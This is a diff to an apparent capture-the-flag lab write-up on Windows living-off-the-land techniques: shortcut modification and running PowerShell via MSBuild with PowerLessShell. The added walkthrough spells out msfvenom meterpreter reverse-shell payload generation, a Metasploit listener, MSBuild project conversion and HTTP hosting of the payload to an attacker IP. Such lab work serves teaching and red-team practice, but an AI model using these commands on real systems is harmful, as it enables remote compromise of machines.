@@ -377,9 +377,7 @@ Keep in mind that this section highlighted a couple of interesting tools. If you
 
 This section highlights a couple of interesting techniques used, whether for initial access or persistence. The following techniques belong to the Living Off the Land umbrella since they can be used as part of the Windows environment utilities.
 
-Shortcuts
-
-![task7-shortcut](./images/task7-shortcut.png)
+### Shortcuts
 
 Shortcuts or symbolic links are a technique used for referring to other files or applications within the operating system. Once a user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this technique to gain initial access, privilege escalation, or persistence. The MITRE ATT&CK framework calls this **Shortcut modification technique** [T1547](https://attack.mitre.org/techniques/T1547/009/), where an attacker creates or modifies a shortcut in order to take advantage of this technique.
 
@@ -390,15 +388,17 @@ To use the shortcut modification technique, we can set the target section to exe
 * Regsvr32
 * Executable on disk
 
+![task7-shortcut](./images/task7-shortcut.png)
+
 The attached figure shows an example of a shortcut modification technique, where the attacker modified the Excel target section to execute a binary using `rundll32.exe`. We choose to execute a calculator instead of running the Excel application. Once the victim clicks on the Excel shortcut icon, the `calc.exe` is executed. For more information about shortcut modification, you may check [this](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md) GitHub repo.
 
 ### No PowerShell!
 
 In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for malicious activities. Therefore, Organizations started to monitor or block powershell.exe from being executed. As a result, adversaries find other ways to run PowerShell code without spawning it.
 
-PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.
-
 ![task7-msbuild](./images/task7-msbuild.png)
+
+PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.
 
 First, let's download a copy of the project from the GitHub repo onto the AttackBox:
 
@@ -437,6 +437,48 @@ Once we run the MSBuild command, wait a couple of seconds till we receive a reve
 ### Answer the questions below
 
 * Replicate the steps of the No PowerShell technique to receive a reverse shell on port `4444`. Once a connection is established, a flag will be created automatically on the desktop. What is the content of the flag file?
+
+	* Create payload
+	
+		```
+		msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.17.127.223 LPORT=4444 -f psh-reflection > liv0ff.ps1
+		```
+
+		![task7-payload](./images/task7-payload.png)
+
+	* Create Listener on Attacker machine
+	
+		```
+		msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.17.127.223;set lport 4444;exploit"
+		```
+
+		![task7-listener](./images/task7-listener)
+
+	* Run PowerLessShell
+	
+		```
+		python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output /tmp/liv0ff.csproj
+		```
+
+		![task7-lessshell](./images/task7-lessshell.png)
+
+	* Create http server on Attacker machine
+	
+		```
+		python3 -m http.server 1337
+		```
+
+		![task7-http](./images/task7-http.png)
+
+	* Download **liv0ff.csproj** via web browser
+	
+		```
+		http://10.17.127.223:1337/liv0ff.csproj
+		```
+
+		![task7-download](./images/task7-download.png)
+
+
 
 ## Task 8 - Real-life Scenario
 
